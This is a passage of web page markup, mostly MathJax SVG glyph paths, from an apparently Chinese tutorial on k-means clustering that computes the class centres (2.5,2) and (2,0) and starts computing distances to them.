data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(4614.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(5059.5,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g></g><g data-mml-node="mo" transform="translate(6068,0)"><path data-c="7D" d="M65 731Q65 745 68 747T88 750Q171 750 216 725T279 670Q288 649 289 635T291 501Q292 362 293 357Q306 312 345 291T417 269Q428 269 431 266T434 250T431 234T417 231Q380 231 345 210T298 157Q293 143 292 121T291 -28V-79Q291 -134 285 -156T256 -198Q202 -250 89 -250Q71 -250 68 -247T65 -230Q65 -224 65 -223T66 -218T69 -214T77 -213Q91 -213 108 -210T146 -200T183 -177T207 -139Q208 -134 209 3L210 139Q223 196 280 230Q315 247 330 250Q305 257 280 270Q225 304 212 352L210 362L209 498Q208 635 207 640Q195 680 154 696T77 713Q68 713 67 716T65 731Z"></path></g><g data-mml-node="mo" transform="translate(6568,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msubsup" transform="translate(7012.7,0)"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="TeXAtom" transform="translate(819,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(819,-297.3) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(9063.1,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(10118.9,0)"><path data-c="7B" d="M434 -231Q434 -244 428 -250H410Q281 -250 230 -184Q225 -177 222 -172T217 -161T213 -148T211 -133T210 -111T209 -84T209 -47T209 0Q209 21 209 53Q208 142 204 153Q203 154 203 155Q189 191 153 211T82 231Q71 231 68 234T65 250T68 266T82 269Q116 269 152 289T203 345Q208 356 208 377T209 529V579Q209 634 215 656T244 698Q270 724 324 740Q361 748 377 749Q379 749 390 749T408 750H428Q434 744 434 732Q434 719 431 716Q429 713 415 713Q362 710 332 689T296 647Q291 634 291 499V417Q291 370 288 353T271 314Q240 271 184 255L170 250L184 245Q202 239 220 230T262 196T290 137Q291 131 291 1Q291 -134 296 -147Q306 -174 339 -192T415 -213Q429 -213 431 -216Q434 -219 434 -231Z"></path></g><g data-mml-node="msub" transform="translate(10618.9,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(11627.5,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(12072.1,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g><g data-mml-node="mo" transform="translate(13080.7,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(13525.4,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g><g data-mml-node="mo" transform="translate(14533.9,0)"><path data-c="7D" d="M65 731Q65 745 68 747T88 750Q171 750 216 725T279 670Q288 649 289 635T291 501Q292 362 293 357Q306 312 345 291T417 269Q428 269 431 266T434 250T431 234T417 231Q380 231 345 210T298 157Q293 143 292 121T291 -28V-79Q291 -134 285 -156T256 -198Q202 -250 89 -250Q71 -250 68 -247T65 -230Q65 -224 65 -223T66 -218T69 -214T77 -213Q91 -213 108 -210T146 -200T183 -177T207 -139Q208 -134 209 3L210 139Q223 196 280 230Q315 247 330 250Q305 257 280 270Q225 304 212 352L210 362L209 498Q208 635 207 640Q195 680 154 696T77 713Q68 713 67 716T65 731Z"></path></g></g></g></svg></mjx-container>，计算类的中心<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.673ex" xmlns="http://www.w3.org/2000/svg" width="9.444ex" height="3.072ex" role="img" focusable="false" viewBox="0 -1060.7 4174 1358"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(911,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(911,-297.3) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1864.7,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msubsup" transform="translate(2309.3,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(911,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(911,-297.3) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g></g></svg></mjx-container></p><script type="math/tex; mode=display">m_1^{(1)}=(\frac {0+5}{2},\frac{2+2}2)^\mathrm T=(2.5,2)^\mathrm T\\m_2^{(1)}=(\frac {0+1+5}{3},\frac{0}3)^\mathrm T=(2,0)^\mathrm T</script><p>对<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.673ex" xmlns="http://www.w3.org/2000/svg" width="45.757ex" height="3.072ex" role="img" focusable="false" viewBox="0 -1060.7 20224.6 1358"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1286.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(2342.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(2731.1,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(3231.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(3675.8,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="msup" transform="translate(4175.8,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="TeXAtom" transform="translate(422,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="54" d="M36 443Q37 448 46 558T55 671V677H666V671Q667 666 676 556T685 443V437H645V443Q645 445 642 478T631 544T610 593Q593 614 555 625Q534 630 478 630H451H443Q417 630 414 618Q413 616 413 339V63Q420 53 439 50T528 46H558V0H545L361 3Q186 1 177 0H164V46H194Q264 46 283 49T309 63V339V550Q309 620 304 625T271 630H244H224Q154 630 119 601Q101 585 93 554T81 486T76 443V437H36V443Z"></path></g></g></g><g data-mml-node="mo" transform="translate(5158.3,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(5603,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(6123,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(6512,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(7520.5,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msubsup" transform="translate(7965.2,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(911,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 